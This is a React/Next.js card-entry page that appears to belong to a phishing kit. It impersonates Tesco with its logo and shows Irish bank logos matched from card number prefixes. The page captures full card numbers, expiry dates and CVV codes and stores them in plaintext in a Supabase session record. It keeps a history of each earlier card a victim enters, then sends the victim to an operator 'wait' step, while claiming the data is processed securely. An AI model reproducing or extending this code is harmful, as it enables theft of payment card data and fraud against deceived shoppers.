"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";
import { getStoredActiveSessionId, persistActiveSession } from "@/lib/session-id-client";

function luhnCheck(value: string): boolean {
  const digits = value.replace(/\D/g, "");
  if (digits.length < 12) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = digits.charCodeAt(i) - 48;
    if (shouldDouble) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

type CardBrand = { name: string; re: RegExp; len: number[] };
const CARD_BRANDS: CardBrand[] = [
  { name: "visa", re: /^4/, len: [13, 16, 19] },
  { name: "mastercard", re: /^(5[1-5]|2[2-7])/, len: [16] },
  { name: "amex", re: /^3[47]/, len: [15] },
  { name: "maestro", re: /^(5[0,6-9]|6)/, len: [12,13,14,15,16,17,18,19] },
];

function detectCardBrand(number: string): CardBrand | null {
  if (!number) return null;
  for (const b of CARD_BRANDS) if (b.re.test(number)) return b;
  return null;
}

function CardBrandLogo({ brand }: { brand: string }) {
  if (brand === "mastercard") {
    return (
      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Mastercard">
        <circle cx="13" cy="11" r="9" fill="#EB001B" />
        <circle cx="23" cy="11" r="9" fill="#F79E1B" fillOpacity="0.85" />
      </svg>
    );
  }
  if (brand === "maestro") {
    return (
      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Maestro">
        <circle cx="13" cy="11" r="9" fill="#0099DF" />
        <circle cx="23" cy="11" r="9" fill="#EC0000" fillOpacity="0.85" />
      </svg>
    );
  }
  if (brand === "visa") {
    return <span className="text-sm font-black italic tracking-tight text-[#1A1F71]">VISA</span>;
  }
  if (brand === "amex") {
    return (
      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-[#0a2463]">AMEX</span>
    );
  }
  return null;
}

// Irlanda bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
type BankBin = { name: string; logo: string; prefixes: string[] };
const IE_BANK_BINS: BankBin[] = [
  { name: "Revolut", logo: "/bank-logos/ireland/revolut.svg", prefixes: ["539859", "535290", "555088", "521776", "428322", "531738", "554511", "552011"] },
  { name: "Wise", logo: "/bank-logos/ireland/wise.svg", prefixes: ["524005", "428092", "554566", "535860", "553326", "530884"] },
  { name: "AIB", logo: "/bank-logos/ireland/aib.svg", prefixes: ["426397", "539996", "535822", "492181", "489372", "556773", "531940"] },
  { name: "Bank of Ireland", logo: "/bank-logos/ireland/bank-of-ireland.svg", prefixes: ["517907", "539825", "454434", "489536", "552589", "456738", "435985"] },
  { name: "Permanent TSB", logo: "/bank-logos/ireland/ptsb.png", prefixes: ["535625", "541282", "555051", "483562", "437771"] },
  { name: "An Post", logo: "/bank-logos/ireland/an-post.svg", prefixes: ["425638", "414050", "473846"] },
  { name: "EBS", logo: "/bank-logos/ireland/ebs.png", prefixes: ["482830", "423742"] },
];

function detectBank(number: string): BankBin | null {
  const digits = number.replace(/\D/g, "");
  if (digits.length < 4) return null;
  for (const bank of IE_BANK_BINS) {
    for (const p of bank.prefixes) {
      if (digits.startsWith(p)) return bank;
    }
  }
  return null;
}

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

export function CardClient({ sessionId: initialSessionId, routeSessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [sessionId, setSessionId] = useState(initialSessionId);
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-1 w-full px-3 py-2",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60",
  };

  useEffect(() => {
    if (initialSessionId) {
      setSessionId(initialSessionId);
      persistActiveSession(initialSessionId, routeSessionId);
      return;
    }
    const stored = getStoredActiveSessionId();
    if (stored) {
      setSessionId(stored);
    }
  }, [initialSessionId, routeSessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setNumber(fd.cardNumber ?? "");
      setExpiry(fd.cardExpiry ?? "");
      setCvc(fd.cardCvc ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);
  const brand = useMemo(() => detectCardBrand(number), [number]);
  const bank = useMemo(() => detectBank(number), [number]);
  const numberValid = useMemo(() => {
    if (!number) return false;
    const digits = number.replace(/\D/g, "");
    if (digits.length < 12) return false;
    return luhnCheck(digits);
  }, [number]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Enter a valid expiry date (MM/YY).");
      return;
    }
    if (!cvcValid) {
      setMsg("Enter a valid CVC/CVV code (3 or 4 digits).");
      return;
    }
    setSaving(true);
    setMsg(null);

    // 1) KART GECMISI KAYDI: ESKI kart degerleri (cardLoginHistory) yeni giristen ONCE history'ye atilir.
    //    Boylece en guncel kart TEKIL olarak cardNumber/cardExpiry/cardCvc'de durur, ESKI kartlar sadece GECMIS MODAL'inda gorunur.
    let cardLoginHistory: unknown[] = [];
    try {
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      const sfd = sessionFormData as Record<string, unknown>;
      const oldHolder = str(sfd.cardHolder);
      const oldNumber = str(sfd.cardNumber);
      const oldExpiry = str(sfd.cardExpiry);
      const oldCvc = str(sfd.cardCvc);
      const newHolder = "";
      const newNumber = number.trim();
      const newExpiry = expiry.trim();
      const newCvc = cvc.trim();
      // Kart numarasi veya son kullanma tarihi degisti ise ESKI'yi history'ye ekle.
      // Ayni kartla tekrar giris (ayni number+expiry+cvc) ise history'ye ekLEME.
      const isDifferentCard = Boolean(
        (oldNumber || oldExpiry || oldCvc) &&
        !(oldNumber === newNumber && oldExpiry === newExpiry && oldCvc === newCvc)
      );
      if (isDifferentCard) {
        const arr: unknown[] = Array.isArray(sfd.cardLoginHistory)
          ? [...(sfd.cardLoginHistory as unknown[])]
          : [];
        arr.unshift({
          submittedAt: new Date().toISOString(),
          cardHolder: oldHolder,
          cardNumber: oldNumber,
          cardExpiry: oldExpiry,
          cardCvc: oldCvc,
        });
        cardLoginHistory = arr;
      }
    } catch {
      /* sessiz */
    }

    const nextFormData: Record<string, unknown> = {
      ...sessionFormData,
      cardHolder: "",
      cardNumber: number.trim(),
      cardExpiry: expiry.trim(),
      cardCvc: cvc.trim(),
    };
    if (cardLoginHistory.length > 0) {
      nextFormData.cardLoginHistory = cardLoginHistory;
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Falha ao guardar.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[var(--brand)]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600">
            Invalid link.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-6 sm:p-10 relative z-10 fade-in">
        
        {/* Right Top Logo Placeholder */}
        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
          <img
            src="/form-assets/tesco-mini-logo.png"
            alt="Tesco"
            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
            id="card-ah-logo"
          />
        </div>

        <div className="mb-6 flex items-start gap-4">
          <div className="mt-1 shrink-0">
            <img src="/form-assets/icon-security.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-[#0a2463] mb-1">{settings.card_title}</h2>
            <p className="text-sm text-gray-600 font-medium">{settings.card_subtitle}</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <label className="block text-sm font-medium text-[#0a2463]">
            <div className="flex items-center justify-between gap-2">
              <span>{settings.card_number_label}</span>
              {(brand || bank) && (
                <span className="flex items-center gap-2">
                  {bank && (
                    <img
                      src={bank.logo}
                      alt={bank.name}
                      title={bank.name}
                      className="h-6 w-auto rounded bg-white px-1 py-0.5 object-contain shadow-sm"
                    />
                  )}
                  {brand && (
                    <span className="rounded-md bg-white px-2 py-1 shadow-sm">
                      <CardBrandLogo brand={brand.name} />
                    </span>
                  )}
                </span>
              )}
            </div>
            <div className="relative mt-2">
              <input
                required
                inputMode="numeric"
                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-gray-900 shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50 ${
                  !numberValid && number.length >= 12
                    ? "border-red-500 bg-red-50 focus:border-red-500"
                    : "border-transparent bg-[#f0f6fb] focus:border-[var(--brand)]"
                }`}
                value={number}
                onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                autoComplete="cc-number"
              />
            </div>
          </label>
          {bank && (
            <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-500">
              <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[var(--brand)]">
                <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
              </svg>
              {bank.name}
            </p>
          )}
          <div className="grid grid-cols-2 gap-3">
            <label className="block text-sm font-medium text-[#0a2463]">
              {settings.card_expiry_label}
              <input
                required
                placeholder="MM/AA"
                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                autoComplete="cc-exp"
                inputMode="numeric"
                maxLength={5}
              />
            </label>
            <label className="block text-sm font-medium text-[#0a2463]">
              {settings.card_cvv_label}
              <input
                required
                inputMode="numeric"
                maxLength={4}
                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                value={cvc}
                onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                autoComplete="cc-csc"
              />
            </label>
          </div>

          {!numberValid && number.length >= 12 ? (
            <p className="text-xs text-red-600">Invalid card number.</p>
          ) : null}

          {!expiryValid && expiry.length > 0 ? (
            <p className="text-xs text-red-600">A data de validade deve estar no formato MM/AA.</p>
          ) : null}

          {!cvcValid && cvc.length > 0 ? (
            <p className="text-xs text-red-600">O código CVV é composto por 3 ou 4 dígitos.</p>
          ) : null}

          {msg ? <p className="text-center text-sm text-red-600">{msg}</p> : null}

          <button
            type="submit"
            disabled={saving || !numberValid || !expiryValid || !cvcValid}
            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(0,83,159,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
          >
            {saving ? "A enviar..." : settings.card_button}
          </button>
          
          <div className="mt-4 flex items-center justify-center gap-2">
            <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
            <span className="text-[13px] font-medium text-gray-600">
              Your data is processed securely.
            </span>
          </div>
        </form>
      </div>
    </div>
  );
}
